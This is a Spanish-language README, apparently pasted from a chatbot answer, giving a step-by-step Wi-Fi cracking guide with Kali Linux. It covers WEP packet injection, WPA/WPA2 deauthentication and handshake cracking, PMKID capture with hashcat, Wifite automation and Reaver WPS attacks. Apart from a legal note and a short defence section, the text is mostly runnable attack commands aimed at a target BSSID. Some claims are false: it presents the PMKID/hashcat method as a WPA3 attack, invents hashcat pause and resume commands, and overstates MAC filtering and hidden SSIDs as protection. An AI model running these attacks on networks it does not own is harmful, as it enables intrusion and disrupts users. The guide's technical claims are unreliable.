# Seguridad-de-redes
Prueba de la seguridad de redes wifi

Aquí tienes la guía completa y detallada para probar la seguridad de redes Wi-Fi (WEP, WPA/WPA2 y WPA3) con Kali Linux en formato README.md. La estructura está optimizada para su uso en Confluence o cualquier repositorio.

README.md - Auditoría de Seguridad Wi-Fi con Kali Linux

📝 Descripción

Este documento proporciona una guía paso a paso para auditar la seguridad de redes Wi-Fi utilizando Kali Linux. Se cubren los protocolos WEP, WPA/WPA2, y WPA3, detallando los comandos y herramientas necesarios para realizar ataques de prueba de penetración de forma ética y legal.

⚠️ Nota Legal: Solo realiza estas pruebas en redes de tu propiedad o con autorización explícita. El uso no autorizado es ilegal.

🧩 Requisitos Previos
	•	Sistema Operativo: Kali Linux (última versión)
	•	Adaptador de Red Wi-Fi: Compatible con modo monitor (ej. ALFA AWUS036ACH)
	•	Herramientas Necesarias:
	•	aircrack-ng para WEP y WPA/WPA2
	•	hcxtools y hashcat para WPA3
	•	wifite para ataques automatizados

Instalación de Herramientas

sudo apt update && sudo apt upgrade -y
sudo apt install aircrack-ng hcxtools hashcat reaver wifite

🗂️ Índice
	1.	Configuración Inicial
	2.	Auditoría de Redes WEP
	3.	Auditoría de Redes WPA/WPA2
	4.	Auditoría de Redes WPA3
	5.	Uso de Herramientas Automatizadas
	6.	Recomendaciones de Seguridad

✅ 1. Configuración Inicial

1.1 Activar Modo Monitor

El modo monitor permite capturar paquetes de red. Abre una terminal y ejecuta:

sudo airmon-ng check kill       # Detiene procesos que interfieren
sudo airmon-ng start wlan0      # Activa el modo monitor en wlan0
iwconfig                        # Verifica que wlan0mon está activo

💻 2. Auditoría de Redes WEP

Aunque WEP es obsoleto, aún puede encontrarse en algunas redes antiguas. Para este ataque usaremos aircrack-ng.

2.1 Escaneo de Redes WEP

sudo airodump-ng wlan0mon

Apunta el BSSID y el CANAL de la red con cifrado WEP.

2.2 Captura de Paquetes

sudo airodump-ng -c [CANAL] --bssid [BSSID] -w captura wlan0mon

	•	-c [CANAL] → Canal de la red.
	•	--bssid [BSSID] → Filtra paquetes solo de esa red.
	•	-w captura → Guarda los datos en el archivo captura.

2.3 Inyección de Paquetes ARP

sudo aireplay-ng -3 -b [BSSID] wlan0mon

Este comando acelera la captura de IVs (vectores de inicialización).

2.4 Cracking de la Clave

Una vez capturados suficientes IVs, descifra la clave:

sudo aircrack-ng captura.cap

Si la clave es débil, la mostrará en formato hexadecimal:

KEY FOUND! [ 12:34:56:78:9A:BC ]

🔒 3. Auditoría de Redes WPA/WPA2

WPA/WPA2 son más seguros, pero siguen siendo vulnerables a ataques de fuerza bruta si la contraseña es débil.

3.1 Escaneo de Redes WPA/WPA2

sudo airodump-ng wlan0mon

Apunta el BSSID, CANAL y nombre de la red.

3.2 Captura del Handshake

sudo airodump-ng -c [CANAL] --bssid [BSSID] -w handshake wlan0mon

Mantén este comando ejecutándose y en otra terminal fuerza la desconexión de un cliente para capturar el handshake:

sudo aireplay-ng -0 10 -a [BSSID] wlan0mon

	•	-0 10 → Envía 10 paquetes de desautenticación.
	•	-a [BSSID] → Desconecta dispositivos de esa red.

Cuando captures el handshake, verás una notificación en la parte superior de la terminal.

3.3 Cracking del Handshake

sudo aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt

	•	handshake.cap → Archivo de captura.
	•	rockyou.txt → Diccionario preinstalado en Kali (ubicado en /usr/share/wordlists).

🧩 4. Auditoría de Redes WPA3

WPA3 es más seguro, pero puedes probar su vulnerabilidad utilizando hcxdumptool y hashcat.

4.1 Captura del PMKID

sudo hcxdumptool -i wlan0mon --enable_status=1 -o wpa3capture.pcapng

Este comando captura el PMKID si está disponible.

4.2 Conversión del Archivo para Hashcat

sudo hcxpcapngtool -o wpa3hash.22000 wpa3capture.pcapng

	•	-o wpa3hash.22000 → Genera un archivo compatible con Hashcat en formato 22000.

4.3 Cracking del Hash con Hashcat

sudo hashcat -m 22000 wpa3hash.22000 /usr/share/wordlists/rockyou.txt --force

	•	-m 22000 → Tipo de hash para WPA3/WPA2.
	•	--force → Obliga el uso de CPU si no hay GPU.

Puedes pausar y reanudar el proceso de cracking:

sudo hashcat --pause
sudo hashcat --resume

⚙️ 5. Uso de Herramientas Automatizadas

Para facilitar las pruebas, puedes usar Wifite o Fern Wi-Fi Cracker.

5.1 Ataque Automático con Wifite

sudo wifite

	•	Detecta y ataca automáticamente redes WEP, WPA/WPA2 y WPA3.
	•	Solo requiere seleccionar la red objetivo.

5.2 Ataque a WPS con Reaver

Si el router tiene WPS habilitado, usa Reaver:

sudo reaver -i wlan0mon -b [BSSID] -vv

	•	-i wlan0mon → Interfaz en modo monitor.
	•	-b [BSSID] → MAC de la red objetivo.
	•	-vv → Muestra información detallada.

🛡️ 6. Recomendaciones de Seguridad

Para proteger tu red Wi-Fi, aplica las siguientes medidas:
	•	Cifrado WPA3: Si es posible, usa WPA3.
	•	Contraseñas Fuertes: Utiliza contraseñas largas con letras, números y símbolos.
	•	Desactiva WPS: El protocolo WPS es vulnerable; desactívalo en la configuración del router.
	•	Filtrado MAC: Limita el acceso solo a dispositivos conocidos.
	•	SSID Oculto: Evita que tu red aparezca en búsquedas públicas.
	•	Actualiza el Firmware: Mantén el router actualizado para prevenir vulnerabilidades conocidas.

🗂️ Estructura del Proyecto

.
├── README.md
├── scripts
│   ├── monitor_mode.sh
│   ├── wpa_attack.sh
│   ├── wpa3_attack.sh
│   └── wep_attack.sh
├── wordlists
│   └── custom_wordlist.txt
└── results
    ├── handshake.cap
    └── wpa3hash.22000

🧑‍💻 Autor
	•	Nombre: Karim
	•	Perfil Profesional: Experto en redes y seguridad informática
	•	Contacto: [Correo electrónico] | [LinkedIn] | [GitHub]

📜 Licencia

Este proyecto está disponible bajo la licencia MIT. Consulta el archivo LICENSE para más detalles.
